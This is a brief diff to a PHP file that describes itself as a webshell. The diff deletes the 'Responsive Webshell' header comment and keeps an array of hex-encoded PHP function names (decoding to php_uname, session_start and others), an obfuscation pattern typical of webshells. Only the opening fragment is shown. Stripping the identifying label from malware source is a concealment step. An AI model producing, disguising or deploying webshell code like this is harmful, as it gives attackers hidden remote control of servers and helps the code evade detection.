@@ -1,9 +1,5 @@
 <?php
 
-          /**
-            * Responsive Webshell
-          **/
-
 $iniarray =   [
         "7068705F756E616D65", # [0]
         "73657373696F6E5F7374617274", # [1]
